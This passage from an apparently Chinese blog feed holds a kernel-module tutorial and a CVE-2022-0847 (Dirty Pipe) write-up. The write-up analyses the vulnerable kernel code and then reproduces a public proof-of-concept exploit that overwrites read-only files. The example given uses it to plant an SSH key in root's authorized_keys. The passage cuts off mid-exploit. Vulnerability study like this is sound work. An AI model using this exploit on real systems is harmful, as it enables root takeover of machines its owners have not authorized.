        <content type="html"><![CDATA[<h1 id="linux设备驱动开发入门"><a href="#linux设备驱动开发入门" class="headerlink" title="linux设备驱动开发入门"></a>linux设备驱动开发入门</h1><h3 id="1-linux内核模块开发入门"><a href="#1-linux内核模块开发入门" class="headerlink" title="1.linux内核模块开发入门"></a>1.linux内核模块开发入门</h3><p>基本步骤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">a(编写内核模块代码)--&gt;b(修改该目录下的Kconfig文件和Makefile)--&gt;c(运行内核模块)</span><br></pre></td></tr></table></figure><h5 id="1-实例"><a href="#1-实例" class="headerlink" title="1.实例"></a>1.实例</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">__init 和__exit为两个宏</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// EXPORT_SYMBOL(gx);(声明符号表，使得该变量或者函数可以被其他模块调用)</span></span><br><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">char</span> *b = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="type">int</span> c[<span class="number">5</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">module_param(a,<span class="type">int</span>,<span class="number">0664</span>);<span class="comment">//内核模块传参,传参后内核函数可以直接使用这些参数</span></span><br><span class="line">module_param(b,charp,<span class="number">0664</span>);</span><br><span class="line">module_param(c,<span class="type">int</span>,<span class="literal">NULL</span>,<span class="number">0664</span>);</span><br><span class="line"><span class="type">int</span> __init <span class="title function_">my_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">    <span class="comment">//init函数必须为int类型</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;just a test for linux kernel module test!\n&quot;</span>);</span><br><span class="line">    printk(<span class="string">&quot;my init linux kernel module is running!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __exit <span class="title function_">my_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//exit函数必须为void类型</span></span><br><span class="line">    printk(<span class="string">&quot;just a test for linux kernel module test!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">module_init(my_init);</span><br><span class="line"><span class="comment">//当该内核模块插入时将会执行my_init函数</span></span><br><span class="line">module_exit(my_exit);</span><br><span class="line"><span class="comment">//当该内核模块移除时将会执行my_exit函数</span></span><br><span class="line">MODULE_LICENCE(<span class="string">&quot;GPL&quot;</span>);<span class="comment">//指定模块的开源协议</span></span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;bugprogram-git&quot;</span>);<span class="comment">//指定模块的作者</span></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;just a kernel module test&quot;</span>);<span class="comment">//指定内核模块的详细信息</span></span><br><span class="line">MODULE_ALIAS(<span class="string">&quot;mymodule&quot;</span>);<span class="comment">//指定模块的别名</span></span><br><span class="line"><span class="comment">//这些MODLE_*的本质其实是定义在static字符数组用于存放指定字符串内容，这些字符串内容链接时存放在.modinfo字段,可以用modinfo命令来查看这些模块信息,用法</span></span><br><span class="line">modinfo $(MODULE_NAME)<span class="comment">//查看某个模块的信息</span></span><br></pre></td></tr></table></figure><h3 id="2-修改模块代码所在的目录的Kconfig文件"><a href="#2-修改模块代码所在的目录的Kconfig文件" class="headerlink" title="2.修改模块代码所在的目录的Kconfig文件"></a>2.修改模块代码所在的目录的Kconfig文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config MY_MODULE</span><br><span class="line">    tristate <span class="string">&quot;this is the linux kernel moule for test&quot;</span></span><br><span class="line">    <span class="built_in">help</span></span><br><span class="line">        just a <span class="built_in">test</span></span><br></pre></td></tr></table></figure><h3 id="3-修改该目录下的Makefile文件"><a href="#3-修改该目录下的Makefile文件" class="headerlink" title="3.修改该目录下的Makefile文件"></a>3.修改该目录下的Makefile文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj-$(CONFIG_MY_MODULE)         += module.o</span><br><span class="line"><span class="comment">#(这里的module.o要和.c文件的文件名一致,MY_MODULE要和Kconfig文件里面的指定一致)</span></span><br></pre></td></tr></table></figure><h3 id="4-运行内核模块"><a href="#4-运行内核模块" class="headerlink" title="4.运行内核模块"></a>4.运行内核模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dmesg -C    <span class="comment">#清除内核已打印的信息</span></span><br><span class="line">dmesg       <span class="comment">#查看内核打印信息</span></span><br><span class="line">lsmod<span class="comment">#显示当前系统已经载入的模块</span></span><br><span class="line">insmod<span class="comment">#将某个模块运行</span></span><br><span class="line">dmesg<span class="comment">#查看内核打印信息</span></span><br></pre></td></tr></table></figure><h2 id="5-linux设备驱动开发"><a href="#5-linux设备驱动开发" class="headerlink" title="5.linux设备驱动开发"></a>5.linux设备驱动开发</h2><p>linux内核用设备号来区分不同的设备,设备号是一个32位的无符号整数,dev_t类型,而且设备号可以分为两个部分,</p><ul><li><p>1.主设备号</p><p>占12位</p></li><li><p>2.次设备号</p><p>占20位</p><h4 id="常用的api"><a href="#常用的api" class="headerlink" title="常用的api"></a>常用的api</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">MAJOR(<span class="type">dev_t</span> dev);</span><br><span class="line"><span class="comment">//获取设备号的主设备号</span></span><br><span class="line">MINOR(<span class="type">dev_t</span> dev);</span><br><span class="line"><span class="comment">//获取设备的次设备号</span></span><br><span class="line">MKDEV(<span class="type">int</span> major,<span class="type">int</span> minor);</span><br><span class="line"><span class="comment">//创建一个设备</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">register_chrdev_region</span><span class="params">(<span class="type">dev_t</span> from,<span class="type">unsigned</span> count,<span class="type">char</span> *name)</span>;</span><br><span class="line"><span class="comment">//手动注册一个设备到内核</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">alloc_chrdev_regionda</span><span class="params">(<span class="type">dev_t</span> *dev,<span class="type">unsigned</span> baseminor,<span class="type">unsigned</span> count,<span class="type">const</span> <span class="type">char</span> *name)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//只需要主次设备号和fops即可注册设备</span></span><br><span class="line"><span class="type">int</span> __register_chrdev(<span class="type">unsigned</span> <span class="type">int</span> major, <span class="type">unsigned</span> <span class="type">int</span> baseminor,</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> count, <span class="type">const</span> <span class="type">char</span> *name,</span><br><span class="line">      <span class="type">const</span> <span class="keyword">struct</span> file_operations *fops)</span><br><span class="line"><span class="type">void</span> <span class="title function_">unregister_chrdev_region</span><span class="params">(<span class="type">dev_t</span> from,<span class="type">unsigned</span> count)</span>;</span><br><span class="line"><span class="comment">//注销一个设备</span></span><br><span class="line"><span class="comment">//动态注册一个设备到内核中</span></span><br><span class="line"><span class="comment">//分配成功后会在/proc/devices中查看到设备号对应的设备名称</span></span><br><span class="line">cdev_alloc(<span class="type">void</span>);</span><br><span class="line">cdev_init(<span class="keyword">struct</span> cdev *dev,<span class="keyword">struct</span> file_operations *fops);</span><br><span class="line">cdev_add(<span class="keyword">struct</span> cdev *dev,<span class="type">dev_t</span> devnum,<span class="type">unsigned</span> <span class="type">int</span> count);</span><br><span class="line">cdev_del(<span class="keyword">struct</span> cdev *dev);</span><br><span class="line"><span class="comment">//将数据从内核空间拷贝到用户空间</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">copy_to_user</span><span class="params">(<span class="type">void</span> __user *to,<span class="type">const</span> <span class="type">void</span> *from,<span class="type">unsigned</span> <span class="type">long</span> n)</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">copy_from_user</span><span class="params">(<span class="type">void</span> *to,<span class="type">void</span> *from,<span class="type">unsigned</span> <span class="type">long</span> n)</span>;</span><br></pre></td></tr></table></figure><h4 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">a(申请设备号)--&gt;b(注册设备号)--&gt;c(设置设备对应的file_ops)--&gt;d(将其加入到内核的链表中)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 软件开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux内核驱动开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-0847漏洞原理及复现</title>
      <link href="/2022/04/17/CVE-2022-0847%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/04/17/CVE-2022-0847%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2022-0847漏洞原理及复现"><a href="#CVE-2022-0847漏洞原理及复现" class="headerlink" title="CVE-2022-0847漏洞原理及复现"></a>CVE-2022-0847漏洞原理及复现</h1><h3 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h3><p>由于内核中copy_page_to_iter_pipe和push_pipe函数的正确初始化存在缺陷,可能存在旧值,攻击者可以利用此漏洞对任意只读文件缓存页进行覆盖,缓存会在系统内保留一段时间,在这段时间内系统的其他进程访问到的该文件内容都是攻击者修改过的文件缓存区的内容,从而将普通用户权限提升至root权限</p><h3 id="2-受影响的linux内核版本"><a href="#2-受影响的linux内核版本" class="headerlink" title="2.受影响的linux内核版本"></a>2.受影响的linux内核版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5.8 &lt;= Linux Kernel &lt; 5.16.11 / 5.15.25 / 5.10.102</span><br></pre></td></tr></table></figure><h3 id="3-源码分析"><a href="#3-源码分析" class="headerlink" title="3.源码分析"></a>3.源码分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">pipe_write</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb,<span class="keyword">struct</span> iov_iter *from)</span></span><br><span class="line">&#123;</span><br><span class="line">    ....</span><br><span class="line">    <span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123;</span><br><span class="line">        <span class="comment">//如果缓存不为空则继续写</span></span><br><span class="line">                 <span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">                 <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">                 <span class="type">int</span> offset = buf-&gt;offset + buf-&gt;len;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//这里判断有没有设置PIPE_BUF_FLAG_CAN_MERGE标志位,有该标志位则可以写(如果该位置空间不够则另开一块空间写)</span></span><br><span class="line">                 <span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">                     offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class="line">                         ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line">                         <span class="keyword">if</span> (ret)</span><br><span class="line">                                 <span class="keyword">goto</span> out;</span><br><span class="line">                        <span class="comment">//写入内容</span></span><br><span class="line">                         ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line">                         <span class="keyword">if</span> (unlikely(ret &lt; chars)) &#123;</span><br><span class="line">                                 ret = -EFAULT;</span><br><span class="line">                                 <span class="keyword">goto</span> out;</span><br><span class="line">                         &#125;</span><br><span class="line"></span><br><span class="line">                         buf-&gt;len += ret;</span><br><span class="line">                         <span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line">                                 <span class="keyword">goto</span> out;</span><br><span class="line">                 &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                 <span class="keyword">if</span> (!pipe-&gt;readers) &#123;</span><br><span class="line">                         send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">                         <span class="keyword">if</span> (!ret)</span><br><span class="line">                                 ret = -EPIPE;</span><br><span class="line">                         <span class="keyword">break</span>;</span><br><span class="line">                 &#125;</span><br><span class="line"></span><br><span class="line">                 head = pipe-&gt;head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在调用spice函数的时候会调用copy_page_to_iter_pipe函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">copy_page_to_iter_pipe</span><span class="params">(<span class="keyword">struct</span> page *page, <span class="type">size_t</span> offset, <span class="type">size_t</span> bytes,</span></span><br><span class="line"><span class="params">                          <span class="keyword">struct</span> iov_iter *i)</span></span><br><span class="line">&#123;</span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> i-&gt;pipe;</span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span>;</span></span><br><span class="line">         <span class="type">unsigned</span> <span class="type">int</span> p_tail = pipe-&gt;tail;</span><br><span class="line">         <span class="type">unsigned</span> <span class="type">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">         <span class="type">unsigned</span> <span class="type">int</span> i_head = i-&gt;head;</span><br><span class="line">                          buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))</span><br><span class="line">                 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">         buf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class="line">         get_page(page);</span><br><span class="line">         <span class="comment">//这里没有初始化标志位</span></span><br><span class="line">         buf-&gt;page = page;</span><br><span class="line">         buf-&gt;offset = offset;</span><br><span class="line">         buf-&gt;len = bytes;</span><br><span class="line"></span><br><span class="line">         pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">         i-&gt;iov_offset = offset + bytes;</span><br><span class="line">         i-&gt;head = i_head;</span><br><span class="line"> out:</span><br><span class="line">          i-&gt;count -= bytes;</span><br><span class="line">         <span class="keyword">return</span> bytes;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="4-漏洞成因"><a href="#4-漏洞成因" class="headerlink" title="4.漏洞成因"></a>4.漏洞成因</h3><p>在调用函数spice的时候,系统会直接将缓存页替换成文件缓存页,并且没有初始化标志位,,由于spice函数在置换缓存页的时候没有对标志位进行初始化,所以该文件缓存页就会被误认为普通的缓存页，如果往管道里面写数据,就会把文件缓存页覆盖,缓存页会在系统内保存一段时间,导致后面访问的进程得到的该文件内容都是攻击者篡改的文件内容,以此可以通过覆盖关键文件达到提权的目的</p><h3 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5.漏洞利用"></a>5.漏洞利用</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* SPDX-License-Identifier: GPL-2.0 */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright 2022 CM4all GmbH / IONOS SE</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Proof-of-concept exploit for the Dirty Pipe</span></span><br><span class="line"><span class="comment"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span></span><br><span class="line"><span class="comment"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span></span><br><span class="line"><span class="comment"> * file contents in the page cache, even if the file is not permitted</span></span><br><span class="line"><span class="comment"> * to be written, immutable or on a read-only mount.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This exploit requires Linux 5.8 or later; the code path was made</span></span><br><span class="line"><span class="comment"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span></span><br><span class="line"><span class="comment"> * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was</span></span><br><span class="line"><span class="comment"> * there before, it just provided an easy way to exploit it.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * There are two major limitations of this exploit: the offset cannot</span></span><br><span class="line"><span class="comment"> * be on a page boundary (it needs to write one byte before the offset</span></span><br><span class="line"><span class="comment"> * to add a reference to this page to the pipe), and the write cannot</span></span><br><span class="line"><span class="comment"> * cross a page boundary.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#x27;\nssh-ed25519 AAA......\n&#x27;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Further explanation: https://dirtypipe.cm4all.com/</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span></span><br><span class="line"><span class="comment"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">prepare_pipe</span><span class="params">(<span class="type">int</span> p[<span class="number">2</span>])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pipe(p)) <span class="built_in">abort</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> pipe_size = fcntl(p[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* fill the pipe completely; each pipe_buffer will now have</span></span><br><span class="line"><span class="comment">   the PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line"><span class="type">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">write(p[<span class="number">1</span>], buffer, n);</span><br><span class="line">r -= n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* drain the pipe, freeing all pipe_buffer instances (but</span></span><br><span class="line"><span class="comment">   leaving the flags initialized) */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line"><span class="type">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">read(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">r -= n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the pipe is now empty, and if somebody adds a new</span></span><br><span class="line"><span class="comment">   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span></span><br><span class="line"><span class="comment">   will be mergeable */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Usage: %s TARGETFILE OFFSET DATA\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* dumb command-line argument parser */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *<span class="type">const</span> path = argv[<span class="number">1</span>];</span><br><span class="line"><span class="type">loff_t</span> offset = strtoul(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *<span class="type">const</span> data = argv[<span class="number">3</span>];</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> data_size = <span class="built_in">strlen</span>(data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (offset % PAGE_SIZE == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="number">1</span>)) + <span class="number">1</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">loff_t</span> end_offset = offset + (<span class="type">loff_t</span>)data_size;</span><br><span class="line"><span class="keyword">if</span> (end_offset &gt; next_page) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot write across a page 